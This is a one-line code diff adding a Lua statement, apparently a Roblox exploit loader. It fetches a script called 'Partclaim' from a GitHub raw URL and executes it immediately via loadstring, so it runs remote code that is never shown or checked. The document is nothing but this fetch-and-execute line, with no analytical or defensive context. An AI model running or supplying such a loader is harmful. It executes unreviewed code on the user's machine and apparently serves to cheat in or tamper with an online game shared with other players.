@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukashub-coder/Partclaim/refs/heads/main/Partclaim"))()
